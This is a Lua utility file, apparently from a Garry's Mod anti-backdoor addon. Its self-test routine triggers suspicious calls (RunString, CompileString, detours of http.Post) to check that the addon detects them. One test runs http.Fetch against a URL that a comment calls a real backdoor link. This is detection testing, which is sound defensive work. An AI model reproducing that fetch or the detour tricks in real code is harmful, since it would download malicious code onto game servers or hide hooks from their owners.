--[[
    ©2020 Xalalau Xubilozo. All Rights Reserved.
    https://tldrlegal.com/license/all-rights-served#summary
    https://xalalau.com/
--]]

function BS:Utils_GetRandomName()
    local name = string.ToTable("qwertyuiopsdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM")
	local newName = ""
	local aux, rand
    
	for i = 1, #name do
		rand = math.random(#name)
		aux = name[i]
		name[i] = name[rand]
		name[rand] = aux
    end

    for i = 1, #name do
        newName = newName .. name[i]
    end

    return newName
end

function BS:Utils_GetFilesCreationTimes()
    local times = {}

    local function parseDir(dir)
        local files, dirs = file.Find(dir .. "*", "LUA")
    
        if not dirs then
            return
        end
    
        for _, fdir in pairs(dirs) do
            parseDir(dir .. fdir .. "/")
        end
    
        for k,v in pairs(files) do
            times[dir .. v] =  file.Time(dir .. v, "LUA")
        end 
    end

    parseDir(self.FOLDER.LUA)

    return times
end

function BS:Utils_RunTests()
    print("\n\n---------------------------------------------------------")
    print("[STARTING TESTS]\n")

    print("\n-----> Hinding function names (Reverse trace test)")
    -- Works with any blacklist combo
    local LocalFakeNameRunStr = _G.RunString
    self.__G.FakeNameRunStr = self.__G["RunString"]
    LocalFakeNameRunStr([[FakeNameRunStr("print('Fail')")]])

    local bak = self.__G["http"]["Post"]
    print("\n-----> Detour a function and call it")
    local function detour() return bak() end
    self.__G["http"]["Post"] = detour
    detour()

    print("\n-----> Detour a function without calling it")
    local function detourSilent() end
    self.__G["http"]["Post"] = detourSilent
    print("\n Detouring auto check test result pending...\n")

    print("\n-----> getfenv")
    self.__G.getfenv()

    print("\n-----> debug.getfenv")
    local function this() end
    self.__G.debug.getfenv(this)

    print("\n-----> http.fetch")
    self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
        print("in http.fetch")
    end)
    print("\n http.Fetch test result pending...\n")

    print("\n-----> RunString")
    self.__G.RunString("RunString(print('WELCOME ******'))", "bla");

    print("\n-----> RunStringEx")
    self.__G.RunStringEx("RunString(print('WELCOME ******'))", "bla");

    print("\n-----> debug.getinfo of RunString\n")
    PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))
    print(self.__G.debug.getinfo(self.__G.RunString).short_src)
    if self.__G.debug.getinfo(self.__G.RunString).short_src == "[C]" then
        print("\n I guess RunString is original (Pass)")
    else
        print("\n RunString is detoured! (Fail)")
    end

    print("\n\n-----> jit.util.funcinfo of debug.getinfo\n")
    PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))
    if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
        print("\n I guess debug.getinfo is original (Pass)")
    else
        print("\n debug.getinfo is detoured! (Fail)")
    end

    print("\n\n-----> CompileFile")
    local compFile = self.__G.CompileFile("bs/server/modules/utils.lua")

    print("\n-----> CompileString")
    local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")

    print("\n[FINISHED TESTS]")
    print("---------------------------------------------------------")
    print("[WAITING FOR]\n")

    print("--> http.Fetch test result...")
    print("--> Detouring auto check test result...")
end
